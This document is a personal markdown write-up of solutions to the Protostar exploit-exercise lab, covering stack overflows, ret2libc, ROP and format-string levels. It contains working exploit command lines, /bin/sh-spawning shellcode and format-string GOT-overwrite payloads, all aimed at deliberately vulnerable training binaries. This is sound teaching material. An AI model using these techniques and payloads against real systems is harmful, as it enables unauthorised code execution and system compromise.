# the solutions of protostar

## table of content

- [the solutions of protostar](#the-solutions-of-protostar)
  - [table of content](#table-of-content)
  - [stack0](#stack0)
    - [stack0 solution](#stack0-solution)
  - [stack1](#stack1)
    - [stack1 solution](#stack1-solution)
  - [stack2](#stack2)
    - [stack2 solution](#stack2-solution)
  - [stack3: python3 encoding(bad characters)](#stack3-python3-encodingbad-characters)
    - [stack3 solution](#stack3-solution)
  - [stack4: modify EIP](#stack4-modify-eip)
    - [stack4 solution](#stack4-solution)
  - [stack5: jmp esp](#stack5-jmp-esp)
    - [stack5 solution](#stack5-solution)
  - [stack6: compile time return address check, forbid returning to stack. RoP gadget (Return to .text section)](#stack6-compile-time-return-address-check-forbid-returning-to-stack-rop-gadget-return-to-text-section)
    - [stack6: Return Oriented Programming](#stack6-return-oriented-programming)
  - [stack7: ret2libc](#stack7-ret2libc)
    - [ret2Libc](#ret2libc)
    - [ret2Libc Summary](#ret2libc-summary)
    - [ret2Libc advanced](#ret2libc-advanced)
  - [misc](#misc)
  - [format0: given the &target([ebp-0xc]) > &buffer([ebp-0x4c])](#format0-given-the-targetebp-0xc--bufferebp-0x4c)
    - [format0 solution](#format0-solution)
  - [format1: assume no ASLR](#format1-assume-no-aslr)
  - [format1: solution](#format1-solution)
  - [format2: `%n$` and arbitrary write](#format2-n-and-arbitrary-write)
    - [format2 solution (the ultimate)](#format2-solution-the-ultimate)
  - [format3: write byte by byte](#format3-write-byte-by-byte)
    - [format3 solution A: 2 bytes write (%n$hn)](#format3-solution-a-2-bytes-write-nhn)
    - [format3 solution B: 1 byte write (the almighty)](#format3-solution-b-1-byte-write-the-almighty)
  - [format4: Procedure Linkage Table (PLT) and Global Offset Table (GOT)](#format4-procedure-linkage-table-plt-and-global-offset-table-got)
    - [format4, process](#format4-process)
    - [format4, solution](#format4-solution)

## stack0

```asm
(gdb)disassemble
Dump of assembler code for function main:
=> 0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     and    esp,0xfffffff0
   0x080483fa <+6>:     sub    esp,0x60                    # allocating space. char buffer[64]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x5c],0x0    # volatile int modified
   0x08048405 <+17>:    lea    eax,[esp+0x1c]
   0x08048409 <+21>:    mov    DWORD PTR [esp],eax
   0x0804840c <+24>:    call   0x804830c <gets@plt>
   0x08048411 <+29>:    mov    eax,DWORD PTR [esp+0x5c]
   0x08048415 <+33>:    test   eax,eax
   0x08048417 <+35>:    je     0x8048427 <main+51>
   0x08048419 <+37>:    mov    DWORD PTR [esp],0x8048500
   0x08048420 <+44>:    call   0x804832c <puts@plt>
   0x08048425 <+49>:    jmp    0x8048433 <main+63>
   0x08048427 <+51>:    mov    DWORD PTR [esp],0x8048529
   0x0804842e <+58>:    call   0x804832c <puts@plt>
   0x08048433 <+63>:    leave
   0x08048434 <+64>:    ret
```

- `[esp+0x1c]`: the variable
- `[esp+0x5c]`: the stack buffer

- when input length > buffer.size, the bottom of the stack (ebp) gets overwrited

- **Think about the pointer. `buffer[65]` points to a higher address than `buffer[0]`.**
- The actual memory location of the `buffer` could be printed using `printf("%p\n", (void *) buffer)`, or `$esp+0x1c` @ `*main + 17`.
- Hence when the buffer overflows, the variable stored at `[esp+0x5c]` @ `*main + 9`, which is higher than the aforementioned `buffer`, will be overwritten eventually.

### stack0 solution

```bash
python3 -c "print('A' * 80)" | ./stack0
```

## stack1

```asm
   0x080484ab <+71>:    cmp    eax,0x61626364
```

```gdb
r $(python3 -c 'print("A" * 64 + "BCDEFGHIJKLMNOPQRSTUVWXYZ")')
r $(python3 -c "print(b'A' * 64 + b'\x42\x43\x44\x45')")
  # the "b'" occupies 2 bytes
b *main + 71
info registers    # eax 0x45444342 
```

### stack1 solution

```bash
# ./stack1 $(python3 -c "print(b'A' * 62 + b'\x64\x63\x62\x61')")
./stack1 $(python3 -c "print('A' * 64 + '\x64\x63\x62\x61')")
```

## stack2

```gdb
b *main+84
```

### stack2 solution

```bash
GREENIE=$(python3 -c "print('A' * 64 + '\x0a\x0d\x0a\x0d')");export GREENIE;printenv GREENIE;
  # if use b'', the \x0a will be literally parsed as '\' 'x' '0' 'a'
./stack2
```

## stack3: python3 encoding(bad characters)

```asm
  0x08048475 <+61>:    call   eax 
```

- find out the target binary

```bash
objdump -d stack3 | grep win
  # @ 0x08 04 84 24 
```

- redirect the `fp();` call. Problem: bad chars

```gdb
b *main + 61
r <<< $(python3 -c "print('A' * 120)")
r <<< $(python3 -c "print('A' * 64 + '\x24\x84\x04\x08')")
  # bad chars. The '\x84' get parsed as '\xc2\x84' in python3. Possible UTF-8 <control> string.
  # solution: use echo -e -n
```

### stack3 solution

```bash
./stack3 <<< $(python3 -c "print('A' * 64)"|xargs echo -en;echo -en '\x24\x84\x04\x08')
```

## stack4: modify EIP

```asm
(gdb) disassemble main
Dump of assembler code for function main:
  0x08048408 <+0>:     push   ebp
  0x08048409 <+1>:     mov    ebp,esp
  0x0804840b <+3>:     and    esp,0xfffffff0                  # padding, esp <- ebp-0xb
  0x0804840e <+6>:     sub    esp,0x50
  0x08048411 <+9>:     lea    eax,[esp+0x10]
  0x08048415 <+13>:    mov    DWORD PTR [esp],eax
  0x08048418 <+16>:    call   0x804830c <gets@plt>
  0x0804841d <+21>:    leave
  0x0804841e <+22>:    ret
End of assembler dump. 
```

```bash
objdump -d ./stack4
  # 080483f4
```

```gdb
b *main + 22
r <<< $(python3 -c "print('A' * 120)")
r <<< $(python3 -c "print('A' * (64 + int(0xb + 0x4)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
```

### stack4 solution

```bash
./stack4 <<< $(python3 -c "print('A' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
./stack4 <<< $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
  # sys.stdout.buffer.write unprintable char test
```

## stack5: jmp esp

```asm
(gdb) disassemble main
Dump of assembler code for function main:
  0x080483c4 <+0>:     push   ebp
  0x080483c5 <+1>:     mov    ebp,esp
  0x080483c7 <+3>:     and    esp,0xfffffff0
  0x080483ca <+6>:     sub    esp,0x50
  0x080483cd <+9>:     lea    eax,[esp+0x10]
  0x080483d1 <+13>:    mov    DWORD PTR [esp],eax
  0x080483d4 <+16>:    call   0x80482e8 <gets@plt>
  0x080483d9 <+21>:    leave
  0x080483da <+22>:    ret
End of assembler dump.
```

- info:
  + `leave` === `# mov esp, ebp -> pop ebp`. The `pop ebp` means esp += 4
  + `ret` esp += 4 again, and `eip <- [esp]`, which is the so-called `JMP esp`

```gdb
b *main + 21
info proc mappings
   # start      end           size        offset objfile
   # 0xffbf2000 0xffc13000    0x21000        0x0 [stack]
./stack5 <<< $(python3 -c "print('A' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')

   # objdump -d ./stack5
   # 080483c4 <main>

   # leave                  esp=0xfff34180 ebp=0xfff341d8 -> esp=0xfff341dc
     # (gdb) x/4wx $esp
     # 0xfff341dc:     0xf7d0ff21      0x00000001      0xfff34274      0xfff3427c 
   # ret
     # eip=0xf7d0ff21
r <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
```

### stack5 solution

```bash
./stack5 <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
```

- A problem: to `jmp esp`, `ebp` must be overwritten (modern system stack cookie)

## stack6: compile time return address check, forbid returning to stack. RoP gadget (Return to .text section)

```bash
./stack6 <<< $(python3 -c "print('A' * 120 )")
  # SIGSEGV
objdump -d stack6
  # getpath()

b *getpath + 57
b *getpath + 116

# smashing the stack -> padding=80
# targetAddr -> p system 0xf7e272e0
# rtnAddr -> 'AAAA'
# find 0xf7da0000, 0xffffffff, "/bin/sh" -> 0xf7f1e0af
# param -> '/bin/sh': 0xf7f1e0af

r <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')
./stack6 <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')

# however __libc change location on each load. Try another method.
```

- `jmp esp` to the .text `ret`, then `jmp esp` again ho bypass the compiler check.

```bash
  # $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90')")

  # For the exam, use the clear-text payload.
python3 -c "import struct;padding=(b'\x90'*80);ret=struct.pack('I', 0x080484f9);eip = struct.pack('I', 0xbffff7c0);pl=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80';print(padding+ret+eip+pl);"
  # in 64 bit use struct.pack('Q', address), will parse the address in the right order (LE/BE) depends on the system.
  # copy the result into $(echo -en 'content')
r <<< $(echo -en '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf9\x84\x04\x08\xc0\xf7\xff\xbf1\xc0Ph//shh/bin\x87\xe3\xb0\x0b\xcd\x80');
  # If without ASLR, breakpoint at *ret, the stack address stays constant. 

  # an alternative
padding=$(for i in {0..61};do echo -en '\x90';done;)
ret0=$(echo -en '\x7c\xff\xff\x0b';)
ret1=$(echo -en '\x80\xff\xff\x0b';) # or substitute the \x80 with (\x80 + <anyInt * 4>), then use NOP sled.
payload=$(echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80')
./stack6 <<< $(echo -en $padding; echo -en $ret0; echo -en $ret1; echo $payload)
```

### stack6: Return Oriented Programming

- Summary:
  + Generally, find a *gadget*, return to it, and use its side effect.
  + e.g. redirecting(return) to the "ret" opcode of the original function, whose address is static in the original `.text` section (assume no ASLR), will pop the `esp` to `eip`. Similar to a `pop EIP`.
  + (however, a clean-up may happens, which may clean up the args. In a `__stdcall`, callee cleans up the stack (e.g. `ret 8`); In a `__cdecl` (C && C++ default), caller cleans up the stack. (`ret` or `ret 0`))
  + (i.e `RET <imm16>` (Intel 64 and IA-32 Architectures... Instruction Set Reference) ref: [__STDCALL asm example](https://en.wikibooks.org/wiki/X86_Disassembly/Calling_Convention_Examples#STDCALL))
  + Redirecting the return to an static `JMP ESP` (a loaded library without ASLR enabled) opcode does the same.

```bash
  # Simulate no ASLR.
  # set breakpoint at *ret, the 1st address will be the constant `ret` address.
  # The second time stop at *ret, `set {int} $esp = $esp + 4` `set {int} ($esp+4) = 0xcccccccc`
  # int3 HIT
```

## stack7: ret2libc

### ret2Libc

- img:
  ![ret2Libc_visual](./img/ret2Libc_visual.jpg)
  ref:(<https://bufferoverflows.net/ret2libc-exploitation-example/>)

- Background: a common call push the param, push rtn address then jmp. (callee push ebp...)

```asm
  0x08048415 <+13>:    mov    DWORD PTR [esp],eax
  0x08048418 <+16>:    call   0x804830c <gets@plt>
```

- Background: stack before a normal `call` `jmp`

```asm
  0x00000000
  ...
  <param>
  <returnAddressAfterTheCall>
  <callee>
  ...
  0xffffffff
```

### ret2Libc Summary

- Overwrite the `<callee>` address, and pretend to be a normal call. Basic structure:

```bash
  # payload = padding + libc_func_addr + ret_addr(could be used to chain exec) + func_param0 + func_param1
r <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')
```

- find the `<callee>` function, from __libc

```gdb
b *main + 62
r
info proc mappings
p system
  # $1 = {int (const char *)} 0x7ffff7e12410 <__libc_system>
x/s 0x7ffff7e12410
p /a 0x7ffff7e12410
  # print as address
```

- find the `<param>` string in __libc, e.g. `"/bin/sh"`

```gdb
find 0x7ffff7dbd000, 0x7fffffffffff, "/bin/sh"
  # 0x7ffff7f745aa
  #!? p /s 0x7ffff7f745aa
x/s 0x7ffff7f745aa
  # "/bin/sh"
```

- parse the payload

### ret2Libc advanced

- Even when `__libc` change its location on each execution, the relative address offset among __libc functions may remain the same.

- Hence if the address of a `__libc` function could be leaked at run time, the ret2Libc would be possible, because the desired function address could be calculated with the offset.

- Note that the offset should be calculated in the target machine.

## misc

```bash
"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
```

## format0: given the &target([ebp-0xc]) > &buffer([ebp-0x4c])

- info:
  + `int sprintf(char *str, const char *format, ...)` writes formatted output to a string buffer pointed by str().
  + when result.length > str.length, buffer overflow.
  + gdb, breakpoint before `cmp`

```gdb
b *vuln + 34
  # 0x08048416 <+34>:    cmp    eax,0xdeadbeef
x/64wx $esp

r $(python3 -c "import sys;sys.stdout.buffer.write(b'A' * 64 + b'\xef\xbe\xad\xde')")
  # for python2, use sys.stdout.write()
```

### format0 solution

```bash
./format0 $(python3 -c "import sys;sys.stdout.buffer.write(b'A' * 64 + b'\xef\xbe\xad\xde')")
  # for python2, use sys.stdout.write()
./format0 $(python3 -c "import sys;sys.stdout.buffer.write(b'%64s\xef\xbe\xad\xde')")
```

## format1: assume no ASLR

```gdb
p &target
  # or objdump -t ./format1
  # $1 = (int *) 0x8049638 <target>
```

- info:
  + overwrite the `varargs` of `printf`, to &target, so that `printf('BBBB%n', &target)`, i.e., the `BBBB` overwrites `<target>`.
  + identify the &target, which should present as an constant value in the stack.

```bash
./format1 $(echo -en "AAAA";for i in {0..960};do echo -en "%.8x-";done;)
  # 32bit, hence 8 digits of hex, '--' as separator, as ' ' is EOL which terminates reading.
```

- the `%x` 'pops' a byte from the stack.

- when the bottom of the `printf()` stack is reached (where the function argument `AAAA` presents), the next value to be poped can be controlled. Use as `%n` param.

## format1: solution

```bash
./format1 $(echo -en "AAAAAACCCCBBBB";for i in {0..127};do echo -en "%.8x-";done;echo -en "%x";)
./format1 $(echo -en "AAAAAA\x38\x96\x04\x08BBBB";for i in {0..127};do echo -en "%.8x-";done;echo -en "%n";)
```

## format2: `%n$` and arbitrary write

- ref: [%n$, specify the nth arg](https://www.ibm.com/docs/en/i/7.4?topic=functions-printf-print-formatted-characters)

```bash
objdump -t ./format2
  # 080496e4 &target
  # gdb -batch -ex 'file ./format2' -ex 'disassemble vuln'
objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
```

```asm
08048454 <vuln>:
 8048454:       55                      push   ebp
 8048455:       89 e5                   mov    ebp,esp
 8048457:       81 ec 18 02 00 00       sub    esp,0x218
 804845d:       a1 d8 96 04 08          mov    eax,ds:0x80496d8
 8048462:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048466:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 804846d:       00
 804846e:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 8048474:       89 04 24                mov    DWORD PTR [esp],eax
 8048477:       e8 e0 fe ff ff          call   804835c <fgets@plt>
 804847c:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 8048482:       89 04 24                mov    DWORD PTR [esp],eax
 8048485:       e8 f2 fe ff ff          call   804837c <printf@plt>
 804848a:       a1 e4 96 04 08          mov    eax,ds:0x80496e4
 804848f:       83 f8 40                cmp    eax,0x40
 8048492:       75 0e                   jne    80484a2 <vuln+0x4e>
 8048494:       c7 04 24 90 85 04 08    mov    DWORD PTR [esp],0x8048590
 804849b:       e8 ec fe ff ff          call   804838c <puts@plt>
 80484a0:       eb 17                   jmp    80484b9 <vuln+0x65>
 80484a2:       8b 15 e4 96 04 08       mov    edx,DWORD PTR ds:0x80496e4
 80484a8:       b8 b0 85 04 08          mov    eax,0x80485b0
 80484ad:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 80484b1:       89 04 24                mov    DWORD PTR [esp],eax
 80484b4:       e8 c3 fe ff ff          call   804837c <printf@plt>
 80484b9:       c9                      leave
 80484ba:       c3                      ret
```

```bash
./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";for i in {0..3};do echo -en "%.8x-";done;echo -en "%n")
  # 48 == &target
  # 64 - 48 = 16
./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";for i in {0..3};do echo -en "%.8x-";done;for i in {0..15};do echo -en "P";done;echo -en "%n")
  # Though both are params of the printf(), the "P..." padding is after the &target and before the %n, hence does not affect the flow.
  
  # More elegantly:
./format2 <<< $(echo -en "AAAA";for i in {0..3};do echo -en "|%.8x";done;)
  # find the 0x41414141
./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%5$x')
  # now the &target is the 5th argument(in 32-bit hex) on the stack (AAAA is the 4th)
  # %5$: `%n$` a form of conversion specifications. The nth argument on the stack.
  # careful do not trigger bash substitution "$x"
./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%6$16d%5$x')
  # print the 6th argument with desiable length of padding, before writing the &target. %6$<len><type>
./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%6$52x%5$n')
```

### format2 solution (the ultimate)

```bash
./format2 <<< $(echo -en "AAAA";for i in {0..3};do echo -en "|%.8x";done;)
./format2 <<< $(echo -en "\xe4\x96\x04\x08";echo -en '%5$60x%4$n')
  # for sh: echo -en $(echo -en "\xe4\x96\x04\x08";echo -en '%5$60x%4$n') | ./format2
```

## format3: write byte by byte

```bash
set SHELL=/bin/bash
./format3 <<< $(echo -en "AAAA";for i in {0..11};do echo -en "|%.8x";done;)
./format3 <<< $(echo -en "\xf4\x96\x04\x08";echo -en '%5$16930112x%12$n')
  # solution 1.
  # hit, but lengthy.
  # the target value is 0x0102 5544 -> \x44\x55 \x02\x01
  # 1st byte: 0x5544, 2nd byte: 0x0102
```

### format3 solution A: 2 bytes write (%n$hn)

```bash
  # h: short [signed, unsigned] int
  # ref: [ibm, format string](https://www.ibm.com/docs/en/i/7.4?topic=functions-printf-print-formatted-characters)
./format3 <<< $(echo -en "\xf4\x96\x04\x08";echo -en '%5$21824x%12$hn')
./format3 <<< $(echo -en "\xf6\x96\x04\x08";echo -en '%5$258x%12$hn')
  # do some adjustment
./format3 <<< $(echo -en "\xf4\x96\x04\x08\xf6\x96\x04\x08";echo -en '%5$250x%13$hn%5$21570x%12$hn')
```

### format3 solution B: 1 byte write (the almighty)

```bash
  # the target value is 0x01025544 -> \x44\x55\x02\x01
./format3 <<< $(echo -en "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08";echo -en '%5$52x%12$n%5$17x%13$n%5$173x%14$n')
  # write lower bytes first, \x44..., then overwrite the higher bytes, step = 1 byte.
  # 0x01 -> 0x101 -> 257
  # 0x02 -> 0x102 -> 258
  # 0x44 -> 0x44 -> 68 + 17 -> 0x55 + 173 -> 0x102, which is 0x02 0x01.
```

## format4: Procedure Linkage Table (PLT) and Global Offset Table (GOT)

```asm
# objdump -M intel -d ./format4| awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'

080484d2 <vuln>:
 80484d2:       55                      push   ebp
 80484d3:       89 e5                   mov    ebp,esp
 80484d5:       81 ec 18 02 00 00       sub    esp,0x218
 80484db:       a1 30 97 04 08          mov    eax,ds:0x8049730
 80484e0:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484e4:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 80484eb:       00
 80484ec:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484f2:       89 04 24                mov    DWORD PTR [esp],eax
 80484f5:       e8 a2 fe ff ff          call   804839c <fgets@plt>
 80484fa:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 8048500:       89 04 24                mov    DWORD PTR [esp],eax
 8048503:       e8 c4 fe ff ff          call   80483cc <printf@plt>
 8048508:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 804850f:       e8 d8 fe ff ff          call   80483ec <exit@plt>

# gdb
# disassemble 0x80483ec
# Dump of assembler code for function exit@plt:
0x080483ec <exit@plt+0>:        jmp    DWORD PTR ds:0x8049724
0x080483f2 <exit@plt+6>:        push   0x30
0x080483f7 <exit@plt+11>:       jmp    0x804837c
# End of assembler dump.

(shell) objdump -d ./format4
  # 080484b4 <hello>:
  # ...
set {int}0x8049724=0x80484b4
c
  # flag
```

```gdb
b *vuln + 61
r
  # hit breapoint 1
disassemble 0x80483ec
  # x/8i 0x80483ec
  # Dump of assembler code for function exit@plt:
  # 0x080483ec <exit@plt+0>:        jmp    *0x8049724
  # 0x080483f2 <exit@plt+6>:        push   $0x30
  # 0x080483f7 <exit@plt+11>:       jmp    0x804837c
  # End of assembler dump.
si
  # 0x080483ec in exit@plt ()
si
  # 0x080483f2 in exit@plt ()
si
  # 0x080483f7 in exit@plt ()

x/8i 0x0804837c
  # 0x804837c:      pushl  0x8049704                      <- which is the address of the GOT table
  # 0x8048382:      jmp    *0x8049708                     <- which is <_dl_runtime_resolve>
  # 
  # (gdb) disassemble 0x8049704
  # Dump of assembler code for function _GLOBAL_OFFSET_TABLE_:
  # 0x08049700 <_GLOBAL_OFFSET_TABLE_+0>:   sub    $0x96,%al
  # ...
si
  # 0x08048382 in ?? ()

disassemble *0x8049708
  # Dump of assembler code for function _dl_runtime_resolve:
  # 0xb7ff6200 <_dl_runtime_resolve+0>:     push   %eax
  # 0xb7ff6201 <_dl_runtime_resolve+1>:     push   %ecx
  # 0xb7ff6202 <_dl_runtime_resolve+2>:     push   %edx
  # 0xb7ff6203 <_dl_runtime_resolve+3>:     mov    0x10(%esp),%edx
  # 0xb7ff6207 <_dl_runtime_resolve+7>:     mov    0xc(%esp),%eax
  # 0xb7ff620b <_dl_runtime_resolve+11>:    call   0xb7ff0550 <_dl_fixup>
  # 0xb7ff6210 <_dl_runtime_resolve+16>:    pop    %edx
  # 0xb7ff6211 <_dl_runtime_resolve+17>:    mov    (%esp),%ecx
  # 0xb7ff6214 <_dl_runtime_resolve+20>:    mov    %eax,(%esp)
  # 0xb7ff6217 <_dl_runtime_resolve+23>:    mov    0x4(%esp),%eax
  # 0xb7ff621b <_dl_runtime_resolve+27>:    ret    $0xc
  # End of assembler dump.

(shell) pidof format4; cat /proc/2424/maps
  # info proc map
  # 08048000-08049000 r-xp 00000000 00:10 7054       /opt/protostar/bin/format4
  # 08049000-0804a000 rwxp 00000000 00:10 7054       /opt/protostar/bin/format4
  # ...
  # b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
  # b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so             <- where 0xb7ff6200 belongs
  # ...
  # bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]

(shell) man ld.so
  # dynamic linker/loader
  # which upon first execute, update the exit@GOT entry [0x8049724], so that it points to the real location of a `libc` function.
  # Initially, the <exit@plt+0> or [0x8049724] points to <exit@plt+6>, which leads to the <_dl_runtime_resolve> call.
```

- hence, the first jmp in `<func@plt+0>` is equivalent to an `JMP ESP`, i.e., `set {int}0x8049724=0x80484b4` redirect the flow.

### format4, process

```bash
# fuzz
./format4 <<< "%x %x %x"
  # objdump -d ./format4
  # 080484b4 <hello>:
```

```bash
./format4 <<< $(echo -en 'AAAA';for i in {0..12};do echo -en '|%x';done;echo -en '%x';)
./format4 <<< $(echo -en 'AAAA';echo -en '%4$x';)
  # the target is *0x08049724 <- 0x80484b4
  # \x24\x97\x04\x08
./format4 <<< $(echo -en '\x24\x97\x04\x08';echo -en '%4$x';)
./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08';echo -en '%5$x';echo -en '%4$x';)
  # from lower address to higher, \xb4 \x84 \x804
./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%4$x%5$x%6$x';)
./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%4$n';)
  # segfault, dmesg at 0xc
./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%5$168x%4$n';)
  # int(0xb4 - 0xc) -> 168
./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%3$168x%4$n%3$208x%5$n%3$1664x%6$n';)
  # int(0x184 - 0xb4) -> 208
  # int(0x804 - 0x184) -> 1664
```

### format4, solution

```bash
./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%3$168x%4$n%3$208x%5$n%3$1664x%6$n';)
```
